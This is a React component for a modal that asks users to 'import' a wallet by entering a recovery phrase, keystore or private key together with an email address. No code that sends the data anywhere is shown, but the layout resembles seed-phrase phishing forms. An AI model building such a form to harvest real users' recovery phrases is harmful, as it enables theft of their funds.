import React, { useState } from 'react';
import { X } from 'lucide-react';
import '../css/import_form.css';

export default function ImportForm({ wallet, onClose }) {
  const [activeTab, setActiveTab] = useState('phrase');

  return (
    <div className="import-modal-overlay">
      <div className="import-modal">
        <div className="import-modal-header">
          <div className="import-modal-header-text">
            <img src={wallet.image} alt={wallet.name} className="import-modal-wallet-icon" />
            <h2>Import your {wallet.name} Wallet</h2>
          </div>
          <button onClick={onClose} className="import-modal-close-button">
            <X size={20} />
          </button>
        </div>
        <div className="import-modal-tabs">
          <button
            className={`tab ${activeTab === 'phrase' ? 'active' : ''}`}
            onClick={() => setActiveTab('phrase')}
          >
            Phrase
          </button>
          <button
            className={`tab ${activeTab === 'keystore' ? 'active' : ''}`}
            onClick={() => setActiveTab('keystore')}
          >
            Keystore JSON
          </button>
          <button
            className={`tab ${activeTab === 'privateKey' ? 'active' : ''}`}
            onClick={() => setActiveTab('privateKey')}
          >
            Private Key
          </button>
        </div>
        <div className="import-modal-content">
          <div className="form-group">
            <label htmlFor="wallet-name">Name wallet</label>
            <input type="text" id="wallet-name" placeholder="Name wallet" />
          </div>
          <div className="form-group">
            <label htmlFor="email">Email</label>
            <input type="email" id="email" placeholder="Email" />
          </div>
          <div className="form-group">
            <label htmlFor="phrase">Phrase</label>
            <textarea id="phrase" placeholder="Enter your recovery phrase" rows="4"></textarea>
            <p className="phrase-description">
              Typically 12 (sometimes 24) words separated by single spaces
            </p>
          </div>
        </div>
        <div className="import-modal-buttons">
          <button className="cancel-button" onClick={onClose}>Cancel</button>
          <button className="proceed-button">Proceed</button>
        </div>
      </div>
    </div>
  );
}
